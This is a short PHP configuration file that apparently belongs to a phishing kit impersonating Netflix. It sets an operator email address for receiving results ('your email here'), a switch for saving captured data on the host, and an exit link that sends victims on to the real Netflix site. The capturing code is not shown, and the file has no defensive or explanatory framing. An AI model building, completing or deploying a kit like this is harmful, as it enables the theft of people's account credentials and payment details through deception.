<?php
$to = "email@email.com"; // your email here
$saveonhost = 0; //1 for enable and 0 for disable
$ExitLink = 'https://www.netflix.com';
?>